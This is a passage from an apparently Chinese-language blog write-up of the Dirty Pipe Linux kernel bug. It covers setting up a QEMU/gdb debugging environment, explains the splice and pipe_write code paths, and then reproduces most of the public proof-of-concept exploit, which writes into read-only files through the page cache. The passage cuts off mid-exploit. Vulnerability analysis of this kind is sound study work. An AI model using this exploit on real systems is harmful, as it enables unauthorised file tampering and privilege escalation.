-y dist-upgrade</span><br></pre></td></tr></table></figure><p>启动 docker 的时候千万要注意！！</p><ul><li>增加 SYS_PTRACE（打开调试）</li><li>增加端口映射（这样才能让外部主机连上 gdb）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=mdp1 --cap-add=SYS_PTRACE -p 1234:1234 my_dirty_pipe:1.0 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="other-tools"><a class="markdownIt-Anchor" href="#other-tools">#</a> other tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alias agi=&quot;/bin/apt-get install -y&quot;</span><br><span class="line">agi vim gdb gdbserver wget make gcc flex bison bc git cpio ninja-build pkg-config automake libtool</span><br><span class="line">agi libncurses-dev openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf libglib2.0-dev</span><br><span class="line">agi libpixman-1-dev python</span><br></pre></td></tr></table></figure><h2 id="qemu"><a class="markdownIt-Anchor" href="#qemu">#</a> qemu</h2><p>一个报错的解决文档 <a href="https://hackmd.io/@vqXkRUAvSzWmuGTirpUnMQ/rkVhfCa-r">QEMU contribution - HackMD</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class="line">mkdir build &amp;&amp; cd build  # 在下载目录新建文件夹build（这是必须的，因为configure命令必须在build文件夹下执行）</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下均在/build目录下</span></span><br><span class="line">../configure</span><br><span class="line">make  # 编译源码</span><br><span class="line">make install  # 安装</span><br></pre></td></tr></table></figure><p>这得老半天了</p><h2 id="linux"><a class="markdownIt-Anchor" href="#linux">#</a> Linux</h2><p>选用 v5.13-rc1 版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/torvalds/linux/archive/refs/tags/v5.13-rc1.tar.gz</span><br><span class="line">make menuconfig </span><br><span class="line">cat /proc/cpuinfo| grep &quot;cpu cores&quot; | uniq # check cpu core counts</span><br><span class="line">make bzImage -j4</span><br></pre></td></tr></table></figure><p>扣 y 选中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kernel hacking -&gt;compile-time checks and compiler opt -&gt; compile the kernel with debug info</span><br><span class="line">-&gt; Provide GDB scripts for kernel debugging</span><br><span class="line">-&gt; Generate readable assembler code               </span><br><span class="line">kernel hacking -&gt; compile the kernel with frame pointers (没找到)</span><br><span class="line">kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger -&gt;</span><br><span class="line">KGDB: use kgdb over the serial console (NEW)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后记得保证以下几个也打开了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_DEBUG_INFO_DWARF4=y</span><br></pre></td></tr></table></figure><p>然后随便找个 ctf 的文件系统就行 或者 busybox 编译。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; ../rootfs.img #解包cpio</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img #打包cpio</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./arch/x86/boot/bzImage \</span><br><span class="line">-initrd ./rootfs.img \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-nographic \</span><br><span class="line">-net nic,model=virtio \</span><br><span class="line">-net user \</span><br><span class="line">-s \</span><br><span class="line">-S</span><br></pre></td></tr></table></figure><h1 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析">#</a> 静态分析</h1><h4 id="splice函数"><a class="markdownIt-Anchor" href="#splice函数">#</a> splice 函数</h4><p>在两个 fd 中移动数据 为零拷贝操作<br>比如要实现 fp1 到 fp2 的数据拷贝 正常来说是要经历 <code>kernel space -&gt; user space -&gt; kernel space</code> <br> 用 splice 就可以变成 <code>fp1 -&gt; pipe_read -&gt; pipe_write -&gt; fp2</code></p><p>将 fd_in 传递到文件描述符 fd_out，其中文件描述符之一必须引用管道。<br> <code>splice</code>  的零拷贝方法就是，直接用文件缓存页来替换 <code>pipe</code>  中的缓存页 (更改 pipe 缓存页指针指向文件缓存页)。<br>也就是实际上不需要经过把我们的输入拷贝到 pipe 这一步，直接把我们数据的缓存页的位置给到需要用到这个的 fd 就行了。（因为 pipe 就是一端写入一端读入，我如果把文件内容写入管道缓冲区，然后再从管道缓冲区写出，不如在管道缓冲区的时候直接让 buffer 的 page 指向原来那个页的内存缓存页，这样就少了 copy 那一步）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure><ul><li>If fd_in refers to a pipe, then off_in must be NULL</li><li>If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropriately.</li></ul><p>splice 最终会调用 <code>copy_page_to_iter_pipe</code>  函数<br>而这个函数并没有清除 <code>PIPE_BUF_FLAG_CAN_MERGE</code>  位<br> iov_iter 携带了我们写入的那个管道 而这个管道的头部 buf 被指向了我们送入的第一个参数 page，这个 page 是内存缓存页的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 重点 buf的ops指向了文件缓存页 */</span></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;<span class="comment">/* 直接指向了文件缓存页 */</span></span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pipe_write分析"><a class="markdownIt-Anchor" href="#pipe_write分析">#</a> pipe_write 分析</h4><p>利用的点是 pipe 被初始化申请会默认设置 flag 为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="type">ssize_t</span> chars;</span><br><span class="line"><span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head; <span class="comment">// 获取头结点 head是int类型 </span></span><br><span class="line"><span class="comment">// pipe是循环链表结构 如果head == tail 代表空了</span></span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line"><span class="comment">// chars就是数据长度</span></span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果有长度且管道不为空 */</span></span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="comment">// buf指向管道的缓冲区</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ☆ 此处重点 ☆</span></span><br><span class="line"><span class="comment">如果flags标志位为 PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line"><span class="comment">并且当前buf已经写过的offset加上即将写的chars的大小小于PSIZE</span></span><br><span class="line"><span class="comment">就会继续写</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">   <span class="comment">// 验证数据存在 和IO阻塞相关 返回0代表正常</span></span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此函数就是往管道的buf所在的页写数据了 如果写了之后会直接go out 不会走下面的for(;;)</span></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line">(···)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上一页不能接着写的情况 就是本应该走的正常情况</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新申请一个page</span></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line"><span class="comment">/* 重点 初始化阶段 */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// ☆ 默认设置flag为 PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">(···)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析">#</a> POC 分析</h3><ul><li>作者首先填满了 16 个 PIPE，将 flag 都默认设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></li><li>然后读取 清空 pipe</li><li>用 open 打开对应文件，只读即可 这样就将文件放到缓存页里了</li><li>splice 系统调用将对应的管道的 buf 和文件缓存页绑定在一起</li><li>利用 splice 不初始化 <code>PIPE_BUF_FLAG_CAN_MERGE</code>  的特性 继续往管道里写入 就写入到了对应的文件缓存区了<br>这就造成了一个任意文件写的漏洞</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">   leaving the flags initialized) */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line"><span class="type">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">loff_t</span> end_offset = offset + (<span class="type">loff_t</span>)data_size;</span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line"><span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">prepare_pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">--offset;</span><br><span class="line"><span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the following write will not create a new pipe_buffer, 